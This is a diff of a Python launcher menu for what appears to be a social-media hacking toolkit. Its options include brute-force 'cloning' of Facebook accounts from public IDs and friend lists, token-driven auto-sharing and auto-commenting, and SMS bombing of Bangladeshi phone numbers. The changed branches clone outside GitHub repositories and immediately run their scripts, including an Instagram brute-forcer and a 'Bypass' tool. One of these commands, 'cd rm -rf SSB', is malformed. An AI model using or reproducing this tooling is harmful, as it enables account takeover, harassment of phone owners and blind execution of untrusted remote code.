@@ -39,7 +39,6 @@ print("""
 \033[1;32m[18]CLONE FROM 2006- 2009 ID 
 \033[1;37m[19]FB AUTO SHARE (need TOKEN)
 \033[1;33m[20]FB AUTO COMMENT(need TOKEN)
-
                      \033[1;37mFRENDLIST CLONER
 \033[1;33m[21]CLONE FROM  PUBLICK ID  (Best)64 bid                  
 \033[1;36m[22]CLONE FROM  PUBLICK ID  (Best)64 bid
@@ -49,7 +48,6 @@ print("""
 \033[1;33m[26]CLONE FROM FRIENDLIST (34 bid)V3 
 \033[1;32m[27]CLONE FROM FRIENDLIST (34/64bid)V3 
 \033[1;33m[28]CLONE FROM FRIENDLIST  V4
-
                  \033[4;31mOTHET SURVICE 
 \033[1;36m[29]SMS BOMBING BD NUMBER
 \033[1;32m[30]TAMPMAIL [MAO]
@@ -283,12 +281,14 @@ elif pil in ["35"]:
         os.system('git clone https://github.com/noolep/multiBF_ig && apt install jq -y')
         os.system('cd multiBF_ig && bash brute.sh')  
 elif pil in ["36"]:
-	os.system('cd rm -rf SSB')
-        os.system('git clone https://github.com/YounisJohn/SSB')
-        os.system('cd SSB && python Bypass.py')	
+    
+    os.system('cd rm -rf SSB')
+    os.system('git clone https://github.com/YounisJohn/SSB')
+    	
+    os.system('cd SSB && python Bypass.py')	
 elif pil in ["37"]:
         os.system('git clone https://github.com/34TV5TVCGGGGGGGGGGRESWE24354TGWSA/hh')
         os.system('cd hh && python2 b.py')	                
 elif pil in ["38"]:
         os.system('git clone https://github.com/34TV5TVCGGGGGGGGGGRESWE24354TGWSA/hh')
-        os.system('cd hh && python2 2004.py')	                
+        os.system('cd hh && python2 2004.py')	     
